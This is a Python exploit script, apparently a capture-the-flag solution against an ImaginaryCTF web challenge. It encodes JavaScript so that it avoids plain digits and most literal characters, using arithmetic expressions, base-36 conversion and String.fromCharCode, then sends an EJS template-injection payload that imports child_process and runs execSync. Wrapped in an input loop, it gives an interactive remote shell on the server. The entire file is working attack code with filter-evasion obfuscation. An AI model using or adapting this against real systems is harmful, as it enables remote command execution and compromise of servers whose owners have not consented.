import string

import requests

def create_num(n: int):
  orign = n
  odd = n % 2 == 1
  if odd:
    n += 9
  res = ""
  for c in bin(n)[2:-1]:
    if res != "":
      res = f"({res})*2"
    if c == "1":
      res = f"{res}+2" if res != "" else "2"
  if odd:
    res = f"{res}-9"
  assert eval(res) == orign, eval(res)
  return res
  
b36_chr = string.digits + string.ascii_lowercase

def b36encode(s: str):
  res = 0
  for c in s:
    res *= 36
    res += b36_chr.index(c)
  return res


def escape(s: str):
  res = []
  buf = ""
  def process_buf():
    nonlocal buf
    if buf == "": return
    encoded = b36encode(buf)
    res.append(f'({create_num(encoded)}).toString(8*9/2)')
    buf = ""
  for c in s:
    if c in b36_chr:
      buf += c
      continue
    process_buf()
    res.append(f'String.fromCharCode({create_num(ord(c))})')
  process_buf()
  return '+'.join(res)


while True:
  cmd = input("$ ")
  prog = '(await import(' + escape('child_process') + ')).execSync(' + escape(cmd) + ').toString()'
  res = requests.get(
    f'http://1337.chal.imaginaryctf.org',
    { 'text': f'<%= {prog} %>', "dir": "from" }
  )
  print(res.text.split("<h1>")[1].split("</h1>")[0])
